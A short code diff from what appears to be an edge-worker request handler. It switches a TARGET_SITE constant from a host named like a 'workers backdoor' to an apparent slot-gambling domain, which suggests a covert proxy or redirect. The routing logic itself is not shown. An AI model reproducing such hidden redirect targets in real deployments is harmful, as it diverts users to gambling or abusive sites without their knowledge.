@@ -1,4 +1,4 @@
-const TARGET_SITE = 'https://w0rk3rsb4ckd00r.global.ssl.fastly.net/';
+const TARGET_SITE = 'https://slotkingtv1.xyz/';
 
 export async function onRequest(context) {
     const { request } = context;
